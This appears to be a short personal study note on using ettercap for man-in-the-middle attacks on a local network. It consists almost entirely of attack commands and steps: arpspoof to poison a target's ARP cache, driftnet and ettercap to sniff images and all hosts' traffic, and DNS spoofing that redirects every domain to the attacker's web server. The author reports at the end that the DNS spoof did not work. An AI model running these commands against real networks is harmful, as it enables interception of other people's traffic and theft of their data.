# learning ettercap 

**English is not my native language, please excuse typing errors.**

### scan route access point

```shell
traceroute google.com
```

### ARP broken network attacks

```shell
arpspoof -i eth0 -t 192.168.6.101 192.168.6.1
```
### ARP sniff the picture

```shell
driftnet -i eth0 -a -b -d /root/pic
# sniff all host 
ettercap -i eth0 -Tq -M arp:remote /// ///

```
### DNS spofing
- edit the /etc/ettercap/etter.dns file, and insert that(the ip is the kali's address):

```
* A 192.168.1.101
* PTR 192.168.1.101
```
- start the apache/nginx service, and the web environment default path is the `/var/www/html`

```shell
service apache2 start
```
- start the ettercap GUI

```shell
ettercap -G
```
#### scan the host list
- select the eth0 to sniff, scan hosts which in the local network 
- set the router as Target 1, set the target hosts as Target 2
#### config Mitm
- config the Mitm tag
- select the ARP posoning item
- choose the first checkbox which value is "Sniff remote connections"

#### config Plugins 
- slelect the "Manage the plugins" item
- doubble click the "dns\_spoof" to active it
#### start spoof
- select the "Start sniffing" item which under the Start tag
#### test the target host
- It's can't work.
